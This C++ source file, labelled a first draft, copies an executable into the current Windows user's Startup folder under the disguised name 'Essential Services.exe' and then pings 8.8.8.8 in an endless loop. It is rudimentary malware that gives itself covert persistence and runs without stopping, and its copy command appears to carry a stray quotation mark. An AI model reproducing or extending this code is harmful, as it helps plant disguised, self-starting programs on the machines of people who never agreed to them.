#include <iostream>
#include <stdexcept>
#include <stdio.h>
#include <string>
#include <algorithm>
#include <fstream>

using namespace std;

string exec(string command) {	//This function will return the result of a command line operation. Not created by me
   char buffer[128];
   string result = "";

   // Open pipe to file
   FILE* pipe = popen(command.c_str(), "r");
   if (!pipe) {
      return "popen failed!";
   }

   // read till end of process:
   while (!feof(pipe)) {

      // use buffer to read and add to result
      if (fgets(buffer, 128, pipe) != NULL)
         result += buffer;
   }

   pclose(pipe);
   return result;
}
bool isSpace(unsigned char c) {
    return (c == ' ' || c == '\n' || c == '\r' ||
        c == '\t' || c == '\v' || c == '\f');
}
int main()
{	
	string username = exec("echo %username%");
	//Runs the exec command to return current user
	username.erase(std::remove_if(username.begin(), username.end(), isSpace), username.end());	//Remove whitespace in the username
	string documentsFilepath = "\"C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Essential Services.exe\"";
	string command = "\"copy Windows10Draft1.exe " + documentsFilepath;
	const char *charcommand = command.c_str();	//Converts command to format accepted by the system command.
	system(charcommand);	//Executes the charcommand
	while (true)
	{
		system("ping 8.8.8.8");
	}
	
	
}
//First Draft 16/05/2021